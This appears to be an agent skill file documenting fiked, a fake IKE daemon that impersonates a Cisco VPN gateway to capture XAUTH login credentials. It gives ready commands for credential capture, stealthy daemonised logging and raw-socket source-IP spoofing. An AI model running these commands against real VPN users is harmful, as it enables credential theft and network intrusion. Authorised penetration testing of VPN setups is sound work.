---
name: fiked
description: Impersonate a VPN gateway's IKE responder to capture XAUTH login credentials. Use when performing man-in-the-middle (MitM) attacks against insecure Cisco VPN PSK+XAUTH based IPsec authentication setups, sniffing credentials, or testing VPN gateway security.
---

# fiked

## Overview
FakeIKEd (fiked) is a fake IKE daemon designed to attack Cisco VPN PSK+XAUTH authentication. It impersonates a VPN gateway to capture XAUTH login credentials from connecting clients. Category: Sniffing & Spoofing.

## Installation (if not already installed)
Assume fiked is already installed. If you get a "command not found" error:

```bash
sudo apt install fiked
```

Dependencies: libc6, libgcrypt20, libnet9.

## Common Workflows

### Basic credential capture
Impersonate a specific gateway and provide the known Group ID and PSK to capture user XAUTH credentials.
```bash
fiked -g 192.168.1.100 -k mygroup:mysecretpsk
```

### Stealthy background operation with logging
Run as a daemon, suppress stdout, and log captured credentials to a specific file.
```bash
fiked -d -g 10.0.0.1 -k vpngroup:sharedkey -l /root/captured_creds.txt
```

### Forging source address with raw sockets
Use raw sockets to ensure the source IP of the fake responder matches the target gateway address exactly.
```bash
sudo fiked -r -g 172.16.5.1 -k engineering:p@ssword123 -L /var/log/fiked_full.log
```

## Complete Command Reference

```
Usage: fiked [-rdqhV] -g gw -k id:psk [-k ..] [-u user] [-l file] [-L file]
```

### Options

| Flag | Description |
|------|-------------|
| `-r` | Use raw socket: forge IP source address to match `<gateway>` (disables `-u`) |
| `-d` | Detach from TTY and run as a daemon (implies `-q`) |
| `-q` | Be quiet; do not write anything to stdout |
| `-h` | Print help and exit |
| `-V` | Print version and exit |
| `-g <gw>` | VPN gateway address to impersonate |
| `-k <id:psk>` | Pre-shared key (group password/shared secret), prefixed with its group/key ID. The first `-k` provided sets the default. Can be used multiple times |
| `-u <user>` | Drop privileges to the specified unprivileged user account |
| `-l <file>` | Append captured results (credentials) to this log file |
| `-L <file>` | Verbose logging to a file instead of stdout |

## Notes
- This tool performs a "semi-MitM" attack; it captures credentials by acting as the responder but does not currently facilitate a full transparent MitM to the actual gateway.
- Root privileges are typically required for raw socket usage (`-r`) or binding to IKE ports (UDP 500).
- Ensure no other IKE services (like StrongSwan or Libreswan) are running on the host to avoid port conflicts.